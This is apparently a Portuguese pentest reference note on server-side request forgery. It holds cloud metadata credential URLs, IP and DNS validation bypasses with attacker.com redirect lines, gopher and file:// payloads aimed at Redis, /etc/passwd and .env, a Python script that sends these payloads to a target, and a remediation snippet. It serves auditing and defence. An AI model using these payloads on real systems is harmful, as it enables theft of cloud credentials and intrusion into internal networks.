# SSRF — Server-Side Request Forgery

**Tags:** #alto #ssrf #cloud #pivô #rede-interna
**OWASP:** A10:2021 — Server-Side Request Forgery
**CVSS Base:** 8.6 (Alto — sem autenticação, escopo mudado)

---

## 📖 O que é

SSRF permite que um atacante induza o servidor a fazer requisições HTTP para destinos arbitrários — internos ou externos — usando o servidor como proxy privilegiado.

---

## 🔍 `grep_search` Táticas

```
fetch(url
axios.get(url
curl_exec(
file_get_contents($url
HttpClient
WebClient
urllib.request
requests.get(
httpx.get(
http.get(
new URL(
ImageMagick
convert(
```

**Rastrear:** a URL vem de `req.query`, `req.body`, `req.params`, `$_GET`, `$_POST`?

---

## 🎯 Alvos Primários de Pivô

### Cloud Metadata Endpoints (críticos)
| Cloud | URL | O que vaza |
|---|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` | Credenciais IAM temporárias |
| AWS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Access Key + Secret |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Service Account tokens |
| Azure | `http://169.254.169.254/metadata/instance` | Managed Identity tokens |

### Rede Interna
```
http://localhost/admin
http://127.0.0.1:8080/
http://10.0.0.1/
http://192.168.1.1/
http://172.16.0.1/
```

### Serviços Internos Comuns
```
http://localhost:6379/     ← Redis
http://localhost:5432/     ← PostgreSQL
http://localhost:27017/    ← MongoDB
http://localhost:9200/     ← Elasticsearch
http://localhost:8500/     ← Consul
http://localhost:2379/     ← etcd
```

---

## 💣 Técnicas de Bypass de Validação de IP

### Representações Alternativas de `127.0.0.1`
```
http://0x7f000001/          ← hexadecimal
http://2130706433/          ← decimal
http://0177.0.0.1/          ← octal
http://[::1]/               ← IPv6 loopback
http://[::ffff:127.0.0.1]/  ← IPv4-mapped IPv6
http://127.1/               ← notação curta válida
```

### Bypass por DNS
```
http://localh0st/           ← homoglifo
http://127.0.0.1.xip.io/   ← serviço de DNS wildcard
http://customer.internal.attacker.com/  ← DNS controlado → IP interno
```

### Bypass por Redirecionamento
```
http://attacker.com/redirect?to=http://169.254.169.254/
# O servidor valida attacker.com mas segue o redirect para o IP proibido
```

### DNS Rebinding
```
1. Domínio controlado pelo atacante resolve para IP externo (passa na validação)
2. Após validação, o TTL expira e o domínio passa a resolver para IP interno
3. Segunda requisição vai para o IP interno proibido
```

---

## 💣 Protocol Smuggling via SSRF

```
# Redis via Gopher (injeção de comandos)
gopher://internal-redis:6379/_SET%20key%20hacked%0D%0A

# Memcached via SSRF
dict://internal-memcached:11211/set:key:0:0:5:value

# Leitura de arquivo local
file:///etc/passwd
file:///proc/self/environ
file:///app/.env
```

---

## 🧪 Script de Validação Efêmero

```python
# .tmp/validate_ssrf.py
import requests

TARGET = "http://target.com/api/preview"
PARAM  = "url"

# Candidatos a SSRF internos
PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0x7f000001/",
    "http://[::1]/",
]

for p in PAYLOADS:
    try:
        r = requests.post(TARGET, json={PARAM: p}, timeout=5)
        if r.status_code == 200 and len(r.text) > 50:
            print(f"[SSRF POSSÍVEL] {p}")
            print(f"  Resposta: {r.text[:200]}")
        else:
            print(f"[blocked/empty] {p} ({r.status_code})")
    except Exception as e:
        print(f"[error] {p}: {e}")
```

---

## 🔗 Chain Exploits

```
SSRF → AWS Metadata → Access Key IAM → Comprometimento da conta AWS inteira
SSRF → Redis interno → Escrita de chave de sessão → Autenticação como admin
SSRF + Open Redirect → Bypass de whitelist de domínios → SSRF crítico
SSRF + XXE → XXE cego que exfiltra via request HTTP → SSRF como canal de exfiltração
SSRF → Elasticsearch sem auth → dump do banco de dados completo
```

---

## 🛡️ Correção

```python
# ✅ Whitelist de domínios permitidos
ALLOWED_HOSTS = {"api.trusted.com", "cdn.company.com"}

from urllib.parse import urlparse
import socket, ipaddress

def safe_fetch(url: str) -> str:
    parsed = urlparse(url)
    
    # Verificar host na whitelist
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("Host não autorizado")
    
    # Verificar se o IP resolvido é privado (DNS rebinding)
    resolved_ip = socket.gethostbyname(parsed.hostname)
    if ipaddress.ip_address(resolved_ip).is_private:
        raise ValueError("IP privado não permitido")
    
    return requests.get(url, timeout=5, allow_redirects=False).text
```

---

## 📌 Referências
- [[XML External Entity (XXE)]]
- [[Open Redirect]]
- [[IaC Security — Docker Kubernetes Terraform]]
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
